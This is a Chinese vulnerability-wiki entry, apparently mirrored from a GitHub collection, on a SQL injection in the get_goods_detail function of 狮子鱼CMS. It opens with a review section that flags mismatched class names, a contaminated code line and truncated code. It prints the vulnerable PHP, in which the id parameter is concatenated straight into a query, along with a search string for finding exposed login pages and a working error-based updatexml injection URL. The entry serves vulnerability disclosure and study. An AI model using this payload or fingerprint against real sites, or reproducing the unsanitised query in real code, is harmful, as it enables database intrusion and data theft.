---
version: "狮子鱼CMS"
source: "Threekiii/Vulnerability-Wiki"
product: "狮子鱼CMSApigoods"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "狮子鱼CMS-ApigoodController.class.php-SQL注入漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：get_goods_detail id;tokenlookup present butnoenforcementshown;versionunknown"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-fce4f3ecaab462642b5159ab"
entity_id: "ve-fce4f3ecaab462642b5159ab"
schema_version: "1"
canonical: "Web安全/CMS内容/狮子鱼/狮子鱼CMS-ApigoodController.class.php-SQL注入漏洞.md"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：get_goods_detail id;tokenlookup present butnoenforcementshown;versionunknown

- **事实待核（1）**：标题Apigood、正文Apigoods、描述ApiController三种名称错配，应统一真实类。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **代码与转录边界（2）**：video_src混入OSSURL明显源码替换污染，末尾数组代码截断。相应原代码作为存在此问题的历史样本保留，不能直接当作可运行、成功复现的 PoC；缺失内容需回原稿核对，不据此补造可执行攻击链。

- **结论使用边界（3）**：和706不同路由参数应独立原语；token查询不代表必需有效token，也不能无基类就断言匿名。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **事实待核（4）**：缺版本/官方补丁/响应文本。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# 狮子鱼CMS ApigoodController.class.php SQL注入漏洞

## 漏洞描述

狮子鱼CMS ApiController.class.php 参数过滤存在不严谨，导致SQL注入漏洞

## 漏洞影响

```
狮子鱼CMS
```

## 网络测绘

```
"/seller.php?s=/Public/login"
```

## 漏洞复现

登录页面如下

![](./.resource/狮子鱼CMS-ApigoodController.class.php-SQL注入漏洞/media/202202170929313.png)

存在漏洞的文件为 **ApigoodsController.class.php** , 关键位置为

```php
 public function get_goods_detail() {
        $id = I('get.id');
        $pin_id = I('get.pin_id', 0);
		
		$token = I('get.token');
		
		$weprogram_token = M('weprogram_token')->field('member_id')->where( array('token' =>$token) )->find();
		$member_id = $weprogram_token['member_id'];
		
		
		 
		
        $need_data = array();
        $sql = "select g.*,gd.description,gd.is_untake_level,level_discount,gd.video_src,gd.video_size_width,gd.vedio_size_height,gd.is_video,
            gd.summary,gd.share_title,gd.activity_summary,gd.tag from " . C('DB_PREFIX') . "goods g," . C('DB_PREFIX') . "goods_description gd where g.goods_id=gd.goods_id and g.goods_id=" . $id;
        $goods = M()->query($sql);
        $pin_model = D('Home/Pin');
        $goods_model = D('Home/Goods');
        $qian = array(
            "/Uploads/image"
        );
		$c_site_url = str_replace('/dan','',C('SITE_URL'));
        $hou = array(
            $c_site_url . "/Uploads/image"
        );
		$goods[0]['video_src'] = C('SITE_URL')."Uploads/http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/".$goods[0]['video_src'];
		
        $goods[0]['description'] = str_replace($qian, $hou, $goods[0]['description']);
        $goods[0]['description'] = htmlspecialchars_decode($goods[0]['description']);
        $qian = array(
            "\r\n"
        );
```

![](./.resource/狮子鱼CMS-ApigoodController.class.php-SQL注入漏洞/media/202202170929712.png)

漏洞测试为

```plain
https://xxx.xxx.xx.xxx/index.php?s=apigoods/get_goods_detail&id=1%20and%20updatexml(1,concat(0x7e,md5(1),0x7e),1)
```

![](./.resource/狮子鱼CMS-ApigoodController.class.php-SQL注入漏洞/media/202202170929602.png)

---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
